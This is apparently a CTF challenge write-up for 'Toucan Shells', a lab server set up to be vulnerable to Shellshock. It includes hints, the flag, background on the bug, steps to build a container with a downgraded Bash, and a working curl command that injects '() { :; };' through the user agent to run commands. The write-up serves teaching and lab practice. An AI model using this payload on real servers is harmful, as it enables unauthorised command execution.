# Toucan Shells
**Exploitation - Hard**

Wyatt Tauber

## Challenge

**Do not deface the website. Do not make changes to the website. Operations are logged. This site will be reset frequently.**

I like toucans. Do you like toucans? Toucans are not turtles but they might still be vulnerable. Can you find the toucan in this server?

### Hint 1
While this is a website, the vulnerability doesn't lie in a web technology.

### Hint 2
Exporting a variable ad hoc

Escalates permissions to unblock

Persistence or crash

All linked to your bash

With the brackets and colons of __________.

### Hint 3
Shellshock is easier to exploit with `curl` than a web browser. Set `() { :; }; echo; echo; /bin/bash` as your user agent and try running some commands. You'll have to look around a bit, but not outside the HTTP server's folder.

### Flag
`CHAD{t0uc4n_pl4y_th4t_g4m3}`

## Exploit Overview
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Shellshock-bug.png/1024px-Shellshock-bug.png" alt="Shellshock Logo" width="100"/>

**[Shellshock (CVE-2014-6271)](https://www.exploit-db.com/exploits/34765)**

Shellshock is a group of security bugs in Unixâ€™s default Bash (Bourne-Again) shell which allow for a user to run arbitrary code on vulnerable devices that they can connect to. These vulnerabilities were discovered between September 12th and September 24th, 2014 with patches being co-developed by vulnerability researchers and the Bash maintainers prior to disclosure.  The initial discovery showed that Bash would unintentionally execute commands when they were concatenated to the end of function definitions stored in the values of environment variables. There were many ways that the bug could be leveraged, including via the internet through unpatched web servers, SSH servers, DHCP clients, and mail servers. Attackers began exploiting Shellshock within hours of disclosure, attacking various entities such as Akamai, Yahoo!, and the United States Department of Defense.

## Implementation Details

### Docker-Compose:
```
version: '3'

services:

  server:
    image: wwt92829/csec-472-project
    container_name: server
    ports:
      - "80:80"
```
1. Download a vulnerable version of Bash (this image uses 4.2) from [GNU's website](http://ftpmirror.gnu.org/bash/).
2. Create a web server (this image uses Apache httpd) and enable support for CGI. In httpd.conf:
    - Uncomment  `LoadModule cgid_module modules/mod_cgid.so` and `LoadModule cgi_module modules/mod_cgi.so`
    - Uncomment `ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"`
3. Create and frame a shell script with `Content-type: text/html` in an HTML file. The shell script should be stored in the cgi-bin directory specified in httpd.conf.
4. Build a Dockerfile from the [httpd](https://hub.docker.com/_/httpd) Docker image.
    - Update the package lists and install dependencies
    - Downgrade Bash by installing the old version with dpkg
    - Copy httpd.conf to the apache2/conf directory
    - Copy the HTML file with the framed shell script to the htdocs or /var/www/html directory
    - Set the shell script as executable using chmod and place it in the cgi-bin directory
5. Create a Docker-Compose file to build the container and expose the desired port on the host to the container's port 80.

### Run exploit:
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '<command>'" http://localhost/cgi-bin/toucan
```
Set `localhost` to the IP address or hostname of the server to run the exploit on. The Shellshock exploit is invoked by changing the user agent to include a variant of `() { :; };` and replacing `<command>` with any command that will now be executed as the daemon user.

Check the htdocs folder for the flag. It is at http://localhost/T0UC4N.jpg
